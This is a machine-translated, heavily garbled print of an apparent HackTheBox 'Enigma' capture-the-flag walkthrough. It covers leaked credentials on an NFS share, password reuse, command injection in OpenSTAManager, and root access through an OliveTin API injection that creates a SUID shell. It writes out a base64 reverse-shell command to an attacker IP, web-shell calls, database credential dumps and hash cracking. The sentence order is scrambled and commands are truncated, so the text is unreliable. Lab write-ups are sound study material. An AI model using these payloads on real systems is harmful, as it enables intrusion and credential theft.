

nmap
summary
https://medium.com/p/8bc2554ab808/edit
## 9/2/26,  12:50  PM
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
## 1/12
(Season  11)  "Enigma"  HackTheBox:  A  professional  explanation  of  the  game
nmap  -sV  -sC  mail001.enigma.htb
-  Census  and  external  survey.
Weak.  Finally,  CRM  access  is  compromised,  resulting  in  the  leakage  of  unauthenticated  Roundcube  application  administrative  credentials.  This  leads  to  an  email  account  on  NFS.
Enigma  is  a  highly  vulnerable  device  that  relies  on  a  series  of  common  configuration  errors.  The  point  of  entry  is  the  exposure  of  sensitive  credentials  through  sharing.
Gaining  root  privileges  by  injecting  commands  into  a  misconfigured  internal  process  automation  tool  that  operates  with  root  privileges.
Target  10.129.239.191  using  IP  address.  We  begin  by  performing  a  full  network  scan  against  this  address.
Machine Translated by Google

mkdir  -p /tmp/onboarding  sudo  mount
-t  nfs  10.129.239.191:/nfs/onboarding /tmp/onboarding  ls  -la /tmp/onboarding  Output:  #
showmount  -e  10.129.239.191 :Export  list  for
## 10.129.239.191  #
## # /nfs/onboarding
#  -rw-r--r--  1  root  root  1575  Feb  14  19:53  New_Employee_Access.pdf
NFS  Initial  Foothold:  Leakage  Participation  2.
## 2/12
https://medium.com/p/8bc2554ab808/edit
## 9/2/26,  12:50  PM
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
We  are  pinning  this  post  locally  to  examine  its  contents.
Enumerating  services  leads  to  the  disclosure  of  an  accessible  share  directory  (showmount)  using  NFS.
Machine Translated by Google

Inside  the  installed  folder,  we  find  pdf.Access_Employee_New
https://medium.com/p/8bc2554ab808/edit
## 9/2/26,  12:50  PM
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
## 3/12
Converting  this  file  to  plain  text  reveals  a  welcome  document  containing  credentials.  The .PDF  file
(pdftotext)  is  essential  for  registration;  you  can  open  it  in  the  path  provided.  (Open  it  and  extract  the  data  from  this  path,  not  using  a  tool.)
pdftotext  New_Employee_Access.pdf  New_Employee_Access.txt  cat
New_Employee_Access.txt
Machine Translated by Google

We  successfully  log  in  using  http://enigma001.mail.com  and  proceed  to  the  webmail  application .
## Username:  Kevin
## Employee:  Kevin  Mitchell
2024Enigma:  Password
Upon  examining  Kevin's  email,  we  found  a  general  password  policy  where  employees  are  provided  with  the  same  temporary  password.  We  attempted  to  change  the  default
password.  The  default  password  was  on  another  user's  account,  Sarah !  ( Enigma  2024!)
We  gain  access  to  her  inbox.  Inside  Sandra's  inbox,  we  find  an  email  titled  "  2024Enigma:sarah  Roundcube!"  We  log  in  to  OpenSTAManager  with  the
subject  "Re:  Request  to  access
The  email  contains  administrative  credentials  for  a  different  subdomain.
https://medium.com/p/8bc2554ab808/edit
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
## 9/2/26,  12:50  PM
Email  address:  http://mail001.enigma.htb
## 4/12
Sideways  movement:  Reusing  the  password  for  Sarah  3.
Extracted  credentials:
URL:  http://support_001.enigma.htb
Machine Translated by Google

-  Exploitation  of  OpenSTAManager  (CVE-2025–69212)
echo  '10.129.239.191  support_001.enigma.htb'  |  sudo  tee  -a /etc/hosts
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
## 9/2/26,  12:50  PM
https://medium.com/p/8bc2554ab808/edit
## 5/12
## Vulnerability  Identification:  This
specific  version  of  OpenSTAManager  is  vulnerable  to  OS  Command  Injection  during  the  processing  of  signed .p7m  files  (CVE-2025-69212).
When  a  user  uploads  a  file  to  verify  its  signature,  the  application  calls  exec()  against  an  OpenSSL  binary  using  the  filename  provided
by  the  user.
Our  local  IP  address  is  targeted  to  resolve  this  subdomain  to  hosts/etc/.  We  update  it.
admin:  Username
Password:  Ne3s4rTars78s
## Exploit  Strategy:  We
craft  a  malicious .zip  archive  containing  a .p7m  file  with  a  specially  crafted  filename.  The  filename  is  designed  to  break  out  of  the  shell
command  context  and  execute  arbitrary  OS  commands.
We  use  the  following  Python  script  to  generate  the  malicious  payload  ( exploit.py ):
Navigating  to  http://support_001.enigma.htb  reveals  the  OpenSTAManager  CRM  application.  We  log  in  using  the  credentials  discovered  in  Sandra's
email  ( admin:Ne3s4rTars78s ).
Machine Translated by Google

## Establishing  Reverse  Shell:
While  the  application  displays  an  XML  parsing  error,  the  command  injection  is  executed  successfully  in  the
background.
We  run  the  script  and  upload  exploit.zip  via  the  "Importazione  FE"  (Import  XML)  feature  in  the  web  application.
We  confirm  the  web  shell  presence  by  issuing  a  test  command:
We  catch  the  reverse  shell  with  a  netcat  listener:
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
## 9/2/26,  12:50  PM
https://medium.com/p/8bc2554ab808/edit
## 6/12
#  Generate  Base64  encoded  reverse  shell  echo  -n  'bash  -i  >& /dev/
tcp/10.10.14.51/4444  0>&1'  |  base64  -w0  curl  -G  "http://support_001.enigma.htb/files/SHELL.php?"  --data-
urlencode  'c=echo  Y
curl  "http://support_001.enigma.htb/files/SHELL.php?c=id"
#  Output:  uid=33(www-data)  gid=33(www-data)  groups=33(www-data)
ÿÿ
Machine Translated by Google

## $db_name  =  'openstamanager'
## $db_username  =  'brollin'
$db_password  =  'Fri3nds@999'
## ,
file  config.inc.php :
Once  inside  as  www-data
we  browse  the  OpenSTAManager  web  root  and  find  the  configuration
This  file  leaks  MySQL  database  credentials:
We  access  the  MySQL  database  using  these  credentials  to  enumerate  user  accounts:
## 7/12
https://medium.com/p/8bc2554ab808/edit
## 9/2/26,  12:50  PM
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
-  Internal  Pivoting  and  User  Flag
cat /var/www/html/openstamanager/config.inc.php
Machine Translated by Google

We  switch  users  using  the  su  command:
admin:  $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
## Found  Hashes:
haris:  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZe0YXm0biNphrsZDr6ec
The  password  is  successfully  cracked  as  bestfriends .
We  save  the  haris  hash  to  a  file  and  crack  it  using  john  (or  hashcat)  with  the  rockyou.txt  wordlist:
mysql  -u  brollin  -p'Fri3nds@999'  -h  localhost  opensstamanager  -e  "SELECT  username,  p
john  --wordlist=/usr/share/wordlists/rockyou.txt  harris-hash
## 8/12
https://medium.com/p/8bc2554ab808/edit
## 9/2/26,  12:50  PM
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
ÿÿ
Machine Translated by Google

(OliveTin  (Raising  the  privileges  level  to  root  6.
It  operates  as  the  root  user ,  oliveTin,  and  upon  further  examination  of  the  system,  we  discover  a  service  called
I  wrote  that
the  line  was  clearly  inaccessible;  it  was  logged  in  and  hidden,  and  it  appears
to  make  it  clear.
The  matter
A  problem
I  encountered  when
## .
The  guide  captures  the  username /haris/home/ ,  then  navigates  to  the  username  after  reaching  haris .
`i-  bash/bin/  `
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
## 9/2/26,  12:50  PM
https://medium.com/p/8bc2554ab808/edit
## 9/12
ps  aux  |  grep  root  #  root  1440
1  0 ... /usr/local/bin/oliveTin
Password:  bestfriends
su  haris
cat /home/haris/user.txt
Machine Translated by Google

Type:  ascii_identifier
Type:  ascii_identifier
The  identifier  for  database_backup
is:  `mysqldump  -u  {{db_user}}  -p\"  {{db_pass}}  \"  {{db_name}}  > /opt/backups`
## Title:  Database  Backup  -
## Media  -
Name:  db_user
## Password:  Type
-  Name:  db_name
-  Name:  db_pass
Composition  analysis
## 10/12
https://medium.com/p/8bc2554ab808/edit
## 9/2/26,  12:50  PM
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
:  database_backup  A  custom  procedure  named
Key  findings  in  the  settings  file
We  examine  the  configuration  file  located  in  the  following  path :  yaml.config64/amd-linux-OliveTin/oliveTin/opt/
(Unrestricted  access  to  the  API  for  local  users)  false :authRequireGuestsToLogin
ÿÿ
Machine Translated by Google

Which  allows
We  have  the  right
ÿ
ÿ
This  is  a  breach  because  it  directly  injects  the  user  with
random  commands.
The  pass_db  command  is  a
display  within  the  pass_db  command.  By  closing  the  preceding  double  quotes  ( " ),  we  can  inject  pass_db.
By  creating  a  root  shell,  we  design  a  payload  from  SUID  to  inject  an  operating  system  command  that  creates  a  copy.
OliveTin  exploits  API
Injection  explanation
It  is  designated  for  the  password  "p-  closes  what  "x
The  command,  which  allows  the  following  command  to  be  executed:  `mysqldump  terminates` ;
The  files /  tmp/  bs  are  copied  with  setuid  (as  root)  and  the  bit  is  set.
Delete  the  rest  of  the  original  command  by  commenting  it  out  to  prevent  syntax  errors.  # ;
https://medium.com/p/8bc2554ab808/edit
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
## 9/2/26,  12:50  PM
StartAction/OliveTinApiService1.v.api.olivetin/api://127.0.0.1:1337/http  We  define  the  endpoint  of  the  internal  API.
## 11/12
curl  -s  -X  POST  -H  'Content  -Type:  application/json'  --data  '{ "bindingId" :  "backu
ÿÿ
Machine Translated by Google

## "
## You
are  the  one  who  secures  for  the  lightning  strike;  your  choice  is  the  underlying  structure  of  the  battle,  but  here,  the  code  instructions  are  continuous  and  end.
New:  To  gain  root  privileges  and  capture  the  SUID  flag,  and  finally,  we  run  the  envelope.
Her  victim
## .
## "
## 12/12
https://medium.com/p/8bc2554ab808/edit
## 9/2/26,  12:50  PM
Professional  game  editing  tutorial  for  HackTheBox  "Enigma"  (Season  11  -  Medium)
#  root
/tmp/bs  -p  whoami
cat /root/root.txt
Machine Translated by Google